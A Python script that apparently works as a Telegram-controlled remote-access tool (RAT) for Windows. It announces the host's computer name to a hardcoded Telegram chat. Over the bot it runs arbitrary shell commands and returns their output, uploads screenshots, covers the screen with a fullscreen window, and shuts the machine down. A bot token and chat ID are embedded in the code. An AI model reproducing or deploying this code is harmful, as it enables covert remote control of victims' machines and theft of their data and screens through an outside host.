from logging import root
from matplotlib.pyplot import title
from telegram import ReplyKeyboardMarkup
from telegram.ext.updater import Updater
from telegram.update import Update
from telegram.ext.callbackcontext import CallbackContext
from telegram.ext.commandhandler import CommandHandler
from telegram.ext.messagehandler import MessageHandler
from telegram.ext.filters import Filters
import requests
import pyautogui
import subprocess
import cv2
import numpy as np
import tkinter as tk
from datetime import datetime
from ctypes import windll
import json
import atexit
import os

user32 = windll.user32
user32.SetProcessDPIAware()

now = datetime.now()
def onexit():
    text = "going offline"
    requests.post(url="https://api.telegram.org/bot5186491702:AAG8RVHpTmOKuTNrHUoO3Z1FXvj05hYlHmw/sendMessage?chat_id=1424412028&text="+text)
starttext = "online  "+now.strftime("%H:%M:%S")+" "+str(now.date())+" "+os.environ['COMPUTERNAME']
onstart = requests.post(url="https://api.telegram.org/bot5186491702:AAG8RVHpTmOKuTNrHUoO3Z1FXvj05hYlHmw/sendMessage?chat_id=1424412028&text="+starttext)
print(onstart)


bot = Updater("5186491702:AAG8RVHpTmOKuTNrHUoO3Z1FXvj05hYlHmw",use_context=True)
loop_x = 1
gui_text = ""


def start(update: Update, context: CallbackContext):
    update.message.reply_text("running command")
    text = update.message.text
    text2 = text.split("-")
    text3 = text2[1]
    update.message.reply_text("running "+text3)
    a = subprocess.Popen(text3, shell=True, stdout=subprocess.PIPE)
    stdout = a.communicate()
    output = stdout
    str = list(output)
    jsonString = json.dumps(str)
    update.message.reply_text(jsonString)
    
def getshot(update: Update, context: CallbackContext):
    update.message.reply_text("taking screenshot")
    image = pyautogui.screenshot()
    image = cv2.cvtColor(np.array(image),
                        cv2.COLOR_RGB2BGR)
    cv2.imwrite("image1.png", image)
    img = open("image1.png","rb")
    update.message.reply_photo(img)

def gui(update: Update, context: CallbackContext):
    text = update.message.text
    print(text)
    text2 = text.split("-")
    print(text2)
    text3 = text2[1]
    print(text3)
    root=tk.Tk()
    h1 = tk.Label(root,text=text3,font =("Courier", 200)).pack()
    root.wm_attributes('-fullscreen', 'True')
    root.attributes('-topmost',True)
    root.mainloop()

def notify(update: Update, context: CallbackContext):
    text = update.message.text
    print(text)
    text2 = text.split("-")
    print(text2)
    text3 = text2[1]
    print(text3)

def shutdown(update: Update, context: CallbackContext):
    update.message("shutting down")
    os.system("shutdown /s /t 1")


bot.dispatcher.add_handler(CommandHandler('shutdown', shutdown))
bot.dispatcher.add_handler(CommandHandler('start', start))
bot.dispatcher.add_handler(CommandHandler('getshot', getshot))
bot.dispatcher.add_handler(CommandHandler('gui', gui))
bot.dispatcher.add_handler(CommandHandler('notify', notify))

bot.start_polling()
